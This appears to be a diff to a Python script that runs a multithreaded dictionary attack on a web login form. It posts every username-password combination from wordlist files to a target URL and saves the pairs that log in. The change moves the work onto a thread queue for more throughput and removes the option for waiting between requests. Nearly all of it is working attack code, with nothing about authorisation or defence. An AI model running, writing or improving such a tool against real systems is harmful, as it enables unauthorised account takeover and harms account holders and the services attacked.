@@ -2,11 +2,12 @@ import argparse
 import requests
 import threading
 import time
+from queue import Queue
 
-def try_credentials(url, username, password):
+def try_credentials(url, username, password, successful_logins):
     """
     Tries a single set of username and password credentials against the given URL.
-    Returns True if the login is successful, False otherwise.
+    Adds successful logins to the given list.
     """
     data = {
         "username": username,
@@ -16,10 +17,16 @@ def try_credentials(url, username, password):
     response = requests.post(url, data=data)
     if "Login failed" not in response.text:
         print("Login succeeded with username:", username, "and password:", password)
-        with open("successful_logins.txt", "a") as f:
-            f.write(username + ":" + password + "\n")
-        return True
-    return False
+        successful_logins.append((username, password))
+
+def worker(url, credentials_queue, successful_logins):
+    """
+    Worker function that tries credentials from the queue until the queue is empty.
+    """
+    while not credentials_queue.empty():
+        username, password = credentials_queue.get()
+        try_credentials(url, username, password, successful_logins)
+        credentials_queue.task_done()
 
 def run_dictionary_attack(url, username_file, password_file, num_threads):
     """
@@ -28,34 +35,29 @@ def run_dictionary_attack(url, username_file, password_file, num_threads):
     """
     # Read in the usernames and passwords
     with open(username_file, "r") as f:
-        usernames = [line.strip() for line in f.readlines()]
+        usernames = {line.strip() for line in f.readlines()}
     with open(password_file, "r") as f:
-        passwords = [line.strip() for line in f.readlines()]
+        passwords = {line.strip() for line in f.readlines()}
 
-    # Split the usernames and passwords into equal-sized chunks
-    chunk_size = len(usernames) // num_threads
-    username_chunks = [usernames[i:i+chunk_size] for i in range(0, len(usernames), chunk_size)]
-    password_chunks = [passwords[i:i+chunk_size] for i in range(0, len(passwords), chunk_size)]
-
-    # Run the attack using multiple threads
-    threads = []
-    for i in range(num_threads):
-        t = threading.Thread(target=try_credentials_chunk, args=(url, username_chunks[i], password_chunks[i]))
-        t.start()
-        threads.append(t)
-
-    # Wait for all threads to finish
-    for t in threads:
-        t.join()
-
-def try_credentials_chunk(url, usernames, passwords):
-    """
-    Tries all combinations of usernames and passwords in the given chunks against the given URL.
-    """
+    # Create a queue of credentials to try
+    credentials_queue = Queue()
     for username in usernames:
         for password in passwords:
-            if try_credentials(url, username, password):
-                return
+            credentials_queue.put((username, password))
+
+    # Try the credentials using multiple threads
+    successful_logins = []
+    for i in range(num_threads):
+        t = threading.Thread(target=worker, args=(url, credentials_queue, successful_logins))
+        t.start()
+
+    # Wait for all threads to finish
+    credentials_queue.join()
+
+    # Write the successful logins to a file
+    with open("successful_logins.txt", "w") as f:
+        for username, password in successful_logins:
+            f.write(username + ":" + password + "\n")
 
 def main():
     # Parse command line arguments
@@ -64,7 +66,6 @@ def main():
     parser.add_argument("username_file", help="The file containing the usernames to test.")
     parser.add_argument("password_file", help="The file containing the passwords to test.")
     parser.add_argument("-t", "--threads", type=int, default=4, help="The number of threads to use.")
-    parser.add_argument("-w", "--wait", type=float, default=0, help="The amount of time to wait between requests (in seconds).")
     args = parser.parse_args()
 
     # Run the dictionary attack
